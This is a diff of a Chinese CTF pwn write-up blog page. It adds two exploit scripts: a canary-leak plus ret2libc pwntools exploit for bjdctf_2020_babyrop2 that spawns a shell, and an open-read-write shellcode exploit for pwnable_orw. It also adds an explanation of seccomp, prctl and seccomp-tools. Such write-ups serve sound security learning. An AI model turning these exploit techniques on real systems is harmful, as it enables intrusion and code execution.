@@ -140,6 +140,18 @@
             </li>
           
         
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
         
           <li class="nav-item" id="search-btn">
             <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
@@ -190,7 +202,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.5k 字
+      5.5k 字
     </span>
   
 
@@ -200,7 +212,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      96
+      117
        分钟
     </span>
   
@@ -242,7 +254,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：15 天前
+                  不可视境界线最后变动于：1 小时前
                 
               </p>
             
@@ -401,6 +413,51 @@
 
 <h2 id="17-bjdctf-2020-babyrop2"><a href="#17-bjdctf-2020-babyrop2" class="headerlink" title="17.bjdctf_2020_babyrop2"></a>17.bjdctf_2020_babyrop2</h2><p>这题是leak canary + return2libc, 这个值好像不会变呐, 我再去查查</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./bjdctf_2020_babyrop2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29934</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br><span class="hljs-comment">#</span><br>elf = ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>vuln = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400993</span><br><br>sla(<span class="hljs-string">&#x27;u!\n&#x27;</span>, <span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rn(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, puts_got, puts_plt, vuln])<br>sla(<span class="hljs-string">&#x27;ry!\n&#x27;</span>, payload)<br><br>puts_addr = u64(rn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, binsh, sys])<br>sl(payload)<br>sl(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>itt()<br></code></pre></td></tr></table></figure>
+
+<h2 id="18-pwnable-orw"><a href="#18-pwnable-orw" class="headerlink" title="18.pwnable_orw"></a>18.pwnable_orw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25539</span>)<br><br>context.binary = <span class="hljs-string">&#x27;orw&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;orw&#x27;</span>)<br><br>shellcode = shellcraft.open(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode = <span class="hljs-keyword">asm</span>(shellcode)<br><br>sleep(<span class="hljs-number">0.2</span>)<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><strong>新机制: seccomp</strong> </p>
+<blockquote>
+<p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/09/13/ekGP6w4rBUmzyFn.png" srcset="/img/loading.gif" lazyload alt="image-20210913162407923"></p>
+<p>可以看到调用了一个新的函数<code>prctl()</code>. 具体的<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/prctl.2.html">LInux Man Page</a>和<a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/include/linux/prctl.h.html">option使用的宏定义</a>在此</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></td></tr></table></figure>
+
+<p>对于第一个<code>prctl()</code>, 38就是<code>PR_SET_NO_NEW_PRIVS</code>, 因此可以查到作用是: </p>
+<blockquote>
+<p>set the calling thread’s no_new_privs attribute to thevalue in <em>arg2</em>. With no_new_privs set to 1, execve(2)<br>promises not to grant privileges to do anything that couldnot have been done without the execve(2) call (for<br>example,rendering the set-user-ID and set-group-ID modebits,and file capabilities non-functional). Once set,the no_new_privs attribute cannot be unset. </p>
+</blockquote>
+<p>简单来说就是禁用<code>execve()</code>函数以及使用到<code>execve()</code>的其他函数</p>
+<p>对于第二个<code>prctl()</code>, 22就是<code>PR_SET_SECCOMP</code>, 查到的作用是:</p>
+<blockquote>
+<p>Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.</p>
+<p>With arg2 set to <strong>SECCOMP_MODE_STRICT</strong>(equals 1),the only systemcalls that the thread is permitted to make are <code>read</code>(2)，<code>write</code>(2)，<code>_exit</code>(2)(but not exit_group(2)), and <code>sigreturn</code>(2). Other system calls result in the deliveryof a <code>SIGKILL</code> signal. </p>
+<p>With arg2 set to <strong>SECCOMP_MODE_FILTER</strong>(equals 2)(since Linux 3.5)，the system calls allowed are defined by a pointer to aBerkeley Packet Filter passed in arg3. <em>This argument is apointer to struct sock_fprog</em>; it can be designed to filterarbitrary system calls and system call arguments. </p>
+</blockquote>
+<p>如果选了SECCOMP_MODE_FILTER:</p>
+<p>我们先解释一些原理, 一些示例网站在此 (<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013250169/article/details/115669655">seccomp1</a>) (<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/75e157cea215">seccomp2</a>) (<a target="_blank" rel="noopener" href="https://linux.cn/article-9507-1.html">BPF介绍</a>) (<a target="_blank" rel="noopener" href="https://www.cnblogs.com/honpey/p/8013073.html">BPF指令集</a>):</p>
+<ul>
+<li>两个关键struct:</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Filter block */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span> <br>   __u16 code; <span class="hljs-comment">/* Actual filter code */</span> <br>   __u8 jt; <span class="hljs-comment">/* Jump true */</span><br>   __u8 jf; <span class="hljs-comment">/* Jump false */</span><br>   __u32 k; <span class="hljs-comment">/* Generic multiuse field */</span> <br>  <br>&#125;; <br><span class="hljs-comment">/* Required for SO_ATTACH_FILTER. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span> <br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> len; <span class="hljs-comment">/* Number of filter blocks */</span> <br>  	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>code变量涉及到了BPF这种技术, 而seccomp技术就是借鉴BPF的源码, 所以可以到BPF的指令集中找到这个变量的组合方式, 用一些神奇的手段把一些instructions编码进u16中. </li>
+<li>jt和jf的意思较为明显, 就是jump if true||false</li>
+<li>k装啥都行</li>
+</ol>
+<ul>
+<li>作用原理:</li>
+</ul>
+<blockquote>
+<p>每个系统调用都会陷入系统调用控制函数syscall_trace_enter中，该函数中调用了secure_computing，系统调用号作为参数传递。在__secure_computing函数中，通过current-&gt;seccomp.mode提取标志位mode，如果mode为1或者2，则说明当前进程已经设置了seccomp限制。如果是1(<strong>SECCOMP_MODE_STRICT</strong>)则就只允许四个系统调用, 如果是2(<strong>SECCOMP_MODE_FILTER</strong>)就如上面所示</p>
+</blockquote>
+<ul>
+<li>效果: 就是自己设定每一条系统调用所对应的处理方法, 查询方式可以使用下面的工具, 自己设置可以小部分参考→<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013250169/article/details/115669655">这里</a>.</li>
+</ul>
+<p><strong>seccomp-tools</strong>用法:(<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">Github Page</a>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gem install seccomp-tools<br>nevv@ubuntu:~/Desktop/seccomp-tools-master/bin$ seccomp-tools dump ../../pwn1<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 # line11<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 # 0011这个就是左边的标号<br> 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011<br> 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011<br> 0007: 0x15 0x03 0x00 0x0000009d  if (A == prctl) goto 0011<br> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011<br> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0011: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)  #有任何一个不允许的系统调用出现时就反回errornumber<br></code></pre></td></tr></table></figure>
 
 
             </div>
